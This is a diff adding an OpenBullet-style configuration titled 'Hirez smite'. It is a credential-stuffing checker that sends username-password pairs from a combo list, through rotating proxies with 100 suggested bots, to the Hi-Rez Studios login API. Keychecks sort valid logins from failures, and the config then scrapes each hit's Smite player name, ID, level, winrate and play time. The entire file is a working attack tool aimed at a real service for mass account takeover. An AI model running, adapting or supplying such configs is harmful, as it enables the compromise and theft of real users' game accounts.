@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "Hirez smite",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-16T17:03:49.8616195+02:00",
+  "AdditionalInfo": "",
+  "Author": "ILBASS",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.hirezstudios.com/acct/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Origin: https://my.hirezstudios.com" 
+  HEADER "Referer: https://my.hirezstudios.com/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your username and password combination failed authentication. Please try again" 
+  KEYCHAIN Success AND 
+    KEY "user" 
+    KEY "email" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "Smite" 
+
+PARSE "<SOURCE>" LR "Smite\",\"gameId\":300,\"playerName\":\"" "\",\"" -> VAR "INGAME" 
+
+PARSE "<SOURCE>" LR "Smite\",\"gameId\":300,\"playerName\":\"<INGAME>\",\"playerId\":" ",\"" -> VAR "IMGAMEID" 
+
+PARSE "<SOURCE>" JSON "verified" -> CAP "Verified" 
+
+REQUEST GET "https://smite.guru/profile/<IMGAMEID>-<INGAME>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Lvl PARSE "<SOURCE>" LR "class=\"profile-header__level\">" "<" -> CAP "lvl" 
+
+#Winrate PARSE "<SOURCE>" LR "div class=\"ptw__val\" data-v-a806b1ae>" "</div" -> CAP "Winrate" 
+
+#Time_play PARSE "<SOURCE>" LR "class=\"ptw__val\" data-v-620f4aba>" "</div>" -> CAP "Time Play" 
+
